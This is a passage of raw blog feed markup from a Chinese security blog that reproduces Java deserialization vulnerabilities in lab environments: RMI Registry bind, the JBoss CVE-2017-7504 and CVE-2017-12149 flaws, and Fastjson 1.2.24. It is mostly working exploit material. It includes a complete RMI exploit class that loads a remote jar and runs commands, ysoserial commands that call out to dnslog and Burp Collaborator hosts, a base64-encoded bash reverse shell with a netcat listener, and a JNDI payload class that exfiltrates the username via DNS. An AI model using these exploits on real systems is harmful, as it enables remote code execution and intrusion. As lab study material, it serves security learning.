class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIexploit</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Constructor&lt;?&gt; getFirstCtor(<span class="keyword">final</span> String name)</span><br><span class="line">        <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> Constructor&lt;?&gt; ctor = Class.forName(name).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ctor;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (args.length &lt; <span class="number">4</span>) &#123;</span><br><span class="line">            System.out.println(</span><br><span class="line">                <span class="string">"        Usage: java -jar RMIexploit.jar ip port jarfile command"</span>);</span><br><span class="line">            System.out.println(</span><br><span class="line">                <span class="string">"        Example: java -jar RMIexploit.jar 123.123.123.123 1099 http://1.1.1.1.1/ErrorBaseExec.jar \"ls -l\""</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String ip = args[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> port = Integer.parseInt(args[<span class="number">1</span>]);</span><br><span class="line">        String remotejar = args[<span class="number">2</span>];</span><br><span class="line">        String command = args[<span class="number">3</span>];</span><br><span class="line">        <span class="keyword">final</span> String ANN_INV_HANDLER_CLASS = <span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                    <span class="keyword">new</span> ConstantTransformer(java.net.URLClassLoader<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                    new InvokerTransformer("getConstructor",</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123; Class[]<span class="class">.<span class="keyword">class</span> &#125;,</span></span><br><span class="line">                        new Object[] &#123; new Class[] &#123; java.net.URL[].class &#125; &#125;),</span><br><span class="line">                    <span class="keyword">new</span> InvokerTransformer(<span class="string">"newInstance"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123; Object[]<span class="class">.<span class="keyword">class</span> &#125;,</span></span><br><span class="line">                        new Object[] &#123;</span><br><span class="line">                            <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                                <span class="keyword">new</span> java.net.URL[] &#123; <span class="keyword">new</span> java.net.URL(remotejar) &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;),</span><br><span class="line">                    <span class="keyword">new</span> InvokerTransformer(<span class="string">"loadClass"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123; String<span class="class">.<span class="keyword">class</span> &#125;,</span></span><br><span class="line">                        new Object[] &#123; "exploit.ErrorBaseExec" &#125;),</span><br><span class="line">                    <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>,</span><br><span class="line">                        new Class[] &#123; String.class, Class[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123; <span class="string">"do_exec"</span>, <span class="keyword">new</span> Class[] &#123; String<span class="class">.<span class="keyword">class</span> &#125; &#125;),</span></span><br><span class="line">                    new InvokerTransformer("invoke",</span><br><span class="line">                        new Class[] &#123; Object.class, Object[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123; <span class="keyword">null</span>, <span class="keyword">new</span> String[] &#123; command &#125; &#125;)</span><br><span class="line">                &#125;;</span><br><span class="line">            Transformer transformedChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">            Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">            innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line"></span><br><span class="line">            Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>,</span><br><span class="line">                    transformedChain);</span><br><span class="line">            Class cl = Class.forName(</span><br><span class="line">                    <span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">            Constructor ctor = cl.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">            ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            Object instance = ctor.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">outerMap</span>)</span>;</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(ip, port);</span><br><span class="line">            InvocationHandler h = (InvocationHandler) getFirstCtor(ANN_INV_HANDLER_CLASS)</span><br><span class="line">                                                          .newInstance(Target<span class="class">.<span class="keyword">class</span>,</span></span><br><span class="line"><span class="class">                    <span class="title">outerMap</span>)</span>;</span><br><span class="line">            Remote r = Remote<span class="class">.<span class="keyword">class</span>.<span class="title">cast</span>(<span class="title">Proxy</span>.<span class="title">newProxyInstance</span>(</span></span><br><span class="line"><span class="class">                        <span class="title">Remote</span>.<span class="title">class</span>.<span class="title">getClassLoader</span>(),</span></span><br><span class="line">                        new Class[] &#123; Remote.class &#125;, h));</span><br><span class="line">            registry.bind(<span class="string">"pwned"</span>, r);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                System.out.print(e.getCause().getCause().getCause().getMessage());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ee) &#123;</span><br><span class="line">                <span class="keyword">throw</span> e;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>远程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> exploit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ErrorBaseExec</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] readBytes(InputStream in) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        BufferedInputStream bufin = <span class="keyword">new</span> BufferedInputStream(in);</span><br><span class="line">        <span class="keyword">int</span> buffSize = <span class="number">1024</span>;</span><br><span class="line">        ByteArrayOutputStream out = <span class="keyword">new</span> ByteArrayOutputStream(buffSize);</span><br><span class="line">        <span class="keyword">byte</span>[] temp = <span class="keyword">new</span> <span class="keyword">byte</span>[buffSize];</span><br><span class="line">        <span class="keyword">int</span> size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((size = bufin.read(temp)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            out.write(temp, <span class="number">0</span>, size);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        bufin.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] content = out.toByteArray();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">do_exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">final</span> Process p = Runtime.getRuntime().exec(cmd);</span><br><span class="line">            <span class="keyword">final</span> <span class="keyword">byte</span>[] stderr = readBytes(p.getErrorStream());</span><br><span class="line">            <span class="keyword">final</span> <span class="keyword">byte</span>[] stdout = readBytes(p.getInputStream());</span><br><span class="line">            <span class="keyword">final</span> <span class="keyword">int</span> exitValue = p.waitFor();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (exitValue == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"-----------------\r\n"</span> + (<span class="keyword">new</span> String(stdout)) + <span class="string">"-----------------\r\n"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"-----------------\r\n"</span> + (<span class="keyword">new</span> String(stderr)) + <span class="string">"-----------------\r\n"</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        do_exec(<span class="string">"cmd /c dir"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>可看此文章：<a href="https://paper.seebug.org/1251/#rmijdk" target="_blank" rel="noopener">https://paper.seebug.org/1251/#rmijdk</a>   </p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="Java-RMI-Registry-反序列化漏洞-lt-jdk8u111"><a href="#Java-RMI-Registry-反序列化漏洞-lt-jdk8u111" class="headerlink" title="Java RMI Registry 反序列化漏洞(&lt;=jdk8u111)"></a>Java RMI Registry 反序列化漏洞(&lt;=jdk8u111)</h2><p>Java Remote Method Invocation 用于在Java中进行远程调用。RMI存在远程bind的功能(虽然大多数情况不允许远程bind)，在bind过程中，伪造Registry接收到的序列化数据(实现了Remote接口或动态代理了实现了Remote接口的对象)，使Registry在对数据进行反序列化时触发相应的利用链(环境用的是commons-collections:3.2.1).<br>执行如下命令编译及启动RMI Registry和服务器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ./java/rmi-registry-bind-deserialization</span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose run -e RMIIP=your-ip -p 1099:1099 rmi</span><br><span class="line"></span><br><span class="line">//其中，your-ip是服务器IP，客户端会根据这个IP来连接服务器。</span><br><span class="line">//环境启动后，RMI Registry监听在1099端口。</span><br></pre></td></tr></table></figure><p>通过ysoserial的exploit包中的RMIRegistryExploit进行攻击</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit your-ip 1099 CommonsCollections6 <span class="string">"curl your-dnslog-server"</span></span><br></pre></td></tr></table></figure><p><img src="../../images/java/rmi/3.jpg" alt=""><br><img src="../../images/java/rmi/4.jpg" alt=""></p><h2 id="Java-RMI-Registry-反序列化漏洞-lt-jdk8u232-b09"><a href="#Java-RMI-Registry-反序列化漏洞-lt-jdk8u232-b09" class="headerlink" title="Java RMI Registry 反序列化漏洞(&lt;jdk8u232_b09)"></a>Java RMI Registry 反序列化漏洞(&lt;jdk8u232_b09)</h2><p>Java Remote Method Invocation 用于在Java中进行远程调用。RMI存在远程bind的功能(虽然大多数情况不允许远程bind)，在bind过程中，伪造Registry接收到的序列化数据(实现了Remote接口或动态代理了实现了Remote接口的对象)，使Registry在对数据进行反序列化时触发相应的利用链(环境用的是commons-collections:3.2.1).</p><p>自jdk8u121起，Registry对反序列化的类做了白名单限制</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (String<span class="class">.<span class="keyword">class</span> </span>== clazz</span><br><span class="line">        || java.lang.Number<span class="class">.<span class="keyword">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)</span></span><br><span class="line"><span class="class">        || <span class="title">Remote</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)</span></span><br><span class="line"><span class="class">        || <span class="title">java</span>.<span class="title">lang</span>.<span class="title">reflect</span>.<span class="title">Proxy</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)</span></span><br><span class="line"><span class="class">        || <span class="title">UnicastRef</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)</span></span><br><span class="line"><span class="class">        || <span class="title">RMIClientSocketFactory</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)</span></span><br><span class="line"><span class="class">        || <span class="title">RMIServerSocketFactory</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)</span></span><br><span class="line"><span class="class">        || <span class="title">java</span>.<span class="title">rmi</span>.<span class="title">activation</span>.<span class="title">ActivationID</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)</span></span><br><span class="line"><span class="class">        || <span class="title">java</span>.<span class="title">rmi</span>.<span class="title">server</span>.<span class="title">UID</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ObjectInputFilter.Status.ALLOWED;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ObjectInputFilter.Status.REJECTED;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们需要在上面的几个白名单里面找到相应的可利用的类 具体原理见<a href="https://www.anquanke.com/post/id/197829" target="_blank" rel="noopener">浅谈Java RMI Registry安全问题</a></p><p>执行如下命令编译及启动RMI Registry和服务器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ./java/rmi-registry-bind-deserialization-bypass</span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose run -e RMIIP=your-ip -p 1099:1099 rmi</span><br><span class="line"></span><br><span class="line">//其中，your-ip是服务器IP，客户端会根据这个IP来连接服务器。</span><br><span class="line">//环境启动后，RMI Registry监听在1099端口。</span><br><span class="line">``` </span><br><span class="line">通过ysoserial的exploit包中的RMIRegistryExploit2或者3进行攻击</span><br><span class="line">```java</span><br><span class="line">// 开启JRMPListener</span><br><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections6 <span class="string">"curl http://xxxxx.burpcollaborator.net"</span></span><br><span class="line">// 发起攻击</span><br><span class="line">java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit2 192.168.31.88 1099 jrmphost 8888</span><br></pre></td></tr></table></figure><p>参考文章<br><a href="https://xz.aliyun.com/t/9053" target="_blank" rel="noopener">Java安全之RMI反序列化</a><br><a href="https://mp.weixin.qq.com/s?__biz=Mzg3MDAzMDQxNw==&mid=2247488804&idx=1&sn=e9baefc892ff61abb1a298677988a315" target="_blank" rel="noopener">JAVA RMI反序列化知识详解</a><br><a href="https://www.anquanke.com/post/id/197829" target="_blank" rel="noopener">浅谈Java RMI Registry安全问题</a><br><a href="https://paper.seebug.org/1251/" target="_blank" rel="noopener">Java 安全-RMI-学习总结</a></p><p><a href="https://vulhub.org/#/environments/java/rmi-registry-bind-deserialization/" target="_blank" rel="noopener">https://vulhub.org/#/environments/java/rmi-registry-bind-deserialization/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;RMI（Remote Method Invocation），为远程方法调用，是允许运行在一个Java虚拟机的对象调用运行在另一个Java虚拟机上的对象的方法。 这两个虚拟机可以是运行在相同计算机上的不同进程中，也可以是运行在网络上的不同计算机中。&lt;/p&gt;
&lt;p&gt;大部分转载此文章： &lt;a href=&quot;https://xz.aliyun.com/t/9053&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/9053&lt;/a&gt;    &lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>JBOSS漏洞总结</title>
    <link href="https://blog.cfyqy.com/article/46405233.html"/>
    <id>https://blog.cfyqy.com/article/46405233.html</id>
    <published>2021-03-25T03:25:57.000Z</published>
    <updated>2021-03-25T09:51:43.852Z</updated>
    
    <content type="html"><![CDATA[<p>JBoss是一个基于J2EE的开放源代码应用服务器，代码遵循LGPL许可，可以在任何商业应用中免费使用；JBoss也是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。在J2EE应用服务器领域，JBoss是发展最为迅速的应用服务器。由于JBoss遵循商业友好的LGPL授权分发，并且由开源社区开发，这使得JBoss广为流行。</p><a id="more"></a>  <p><img src="../../images/java/jboss/1.png" alt=""></p><h1 id="JBoss-4-x-JBossMQ-JMS-反序列化漏洞（CVE-2017-7504）"><a href="#JBoss-4-x-JBossMQ-JMS-反序列化漏洞（CVE-2017-7504）" class="headerlink" title="JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）"></a>JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）</h1><p>Red Hat JBoss Application Server 是一款基于JavaEE的开源应用服务器。JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。</p><p>参考利用工具JavaDeserH2HC，我们选择一个Gadget：ExampleCommonsCollections1WithHashMap，编译并生成序列化数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac -cp commons-collections-3.2.1.jar; ExampleCommonsCollections1WithHashMap.java</span><br><span class="line">java -cp commons-collections-3.2.1.jar; ExampleCommonsCollections1WithHashMap &quot;touch &#x2F;tmp&#x2F;success&quot;</span><br></pre></td></tr></table></figure><p>注意点   </p><ul><li>javac -cp 指明了.java文件里import的类的位置</li><li>java -cp 指明了执行这个class文件所需要的所有类的包路径-即系统类加载器的路径（涉及到类加载机制）</li><li>路径在linux中用：隔开  在windows中用；隔开</li></ul><p>可见，我们执行的命令是touch /tmp/success。执行完成后，将生成一个文件ExampleCommonsCollections1WithHashMap.ser，将该文件作为body发送如下数据包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://your-ip:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ExampleCommonsCollections1WithHashMap.ser</span><br></pre></td></tr></table></figure><p>或使用 Postman<br><img src="../../images/java/jboss/5.jpg" alt="">  </p><h1 id="JBoss5-x-6-x反序列化漏洞（CVE-2017-12149）"><a href="#JBoss5-x-6-x反序列化漏洞（CVE-2017-12149）" class="headerlink" title="JBoss5.x/6.x反序列化漏洞（CVE-2017-12149）"></a>JBoss5.x/6.x反序列化漏洞（CVE-2017-12149）</h1><p>该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。</p><p><img src="../../images/java/jboss/2.jpg" alt=""></p><p>编写反弹shell的命令</p><p>我们使用bash来反弹shell，但由于Runtime.getRuntime().exec()中不能使用管道符等bash需要的方法，我们需要用进行一次编码。</p><p>工具：<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p><p><img src="../../images/java/jboss/3.jpg" alt="">   </p><p>序列化数据生成</p><p>使用ysoserial来复现生成序列化数据，由于Vulhub使用的Java版本较新，所以选择使用的gadget是CommonsCollections5：  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections5 <span class="string">"bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125; "</span> &gt;poc.ser</span><br></pre></td></tr></table></figure><p>监听端口，等待反弹 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 6666</span><br></pre></td></tr></table></figure><p>发送POC</p><p>生成好的POC即为poc.ser，将这个文件作为POST Body发送至/invoker/readonly即可：<br><img src="../../images/java/jboss/4.jpg" alt="">  </p><p>参考文章：</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzU4NTY4MDEzMw==&mid=2247486026&idx=1&sn=4506f56907afa88daa133119bbaae802" target="_blank" rel="noopener">Jboss漏洞利用总结</a></p><p><a href="https://vulhub.org/" target="_blank" rel="noopener">https://vulhub.org/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;JBoss是一个基于J2EE的开放源代码应用服务器，代码遵循LGPL许可，可以在任何商业应用中免费使用；JBoss也是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。在J2EE应用服务器领域，JBoss是发展最为迅速的应用服务器。由于JBoss遵循商业友好的LGPL授权分发，并且由开源社区开发，这使得JBoss广为流行。&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Fastjson漏洞分析</title>
    <link href="https://blog.cfyqy.com/article/3e624329.html"/>
    <id>https://blog.cfyqy.com/article/3e624329.html</id>
    <published>2021-03-22T03:19:57.000Z</published>
    <updated>2021-04-09T01:18:03.299Z</updated>
    
    <content type="html"><![CDATA[<p>Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object之间互相转换，提供两个主要接口JSON.toJSONString和JSON.parseObject/JSON.parse来分别实现序列化和反序列化操作。        </p><a id="more"></a><h1 id="Fastjson-1-2-22-1-2-24"><a href="#Fastjson-1-2-22-1-2-24" class="headerlink" title="Fastjson 1.2.22-1.2.24"></a>Fastjson 1.2.22-1.2.24</h1><p>漏洞环境  </p><p>运行测试环境： </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>环境运行后，访问<a href="http://your-ip:8090即可看到JSON格式的输出。">http://your-ip:8090即可看到JSON格式的输出。</a></p><p>我们向这个地址POST一个JSON对象，即可更新服务端的信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;your-ip:8090&#x2F; -H &quot;Content-Type: application&#x2F;json&quot; --data &#39;&#123;&quot;name&quot;:&quot;hello&quot;, &quot;age&quot;:20&#125;&#39;</span><br></pre></td></tr></table></figure><p>漏洞复现：  </p><p>因为目标环境是Java 8u102，没有com.sun.jndi.rmi.object.trustURLCodebase的限制，我们可以使用com.sun.rowset.JdbcRowSetImpl的利用链，借助JNDI注入来执行命令。</p><p>起一个WEB服务器，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server <span class="number">80</span></span><br></pre></td></tr></table></figure><p>首先编译并上传命令执行代码到WEB服务中 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// javac TouchFile.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TouchFile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands =  &#123; <span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, <span class="string">"ping -c 1 `whoami`.xxx.dnslog.cn"</span>&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        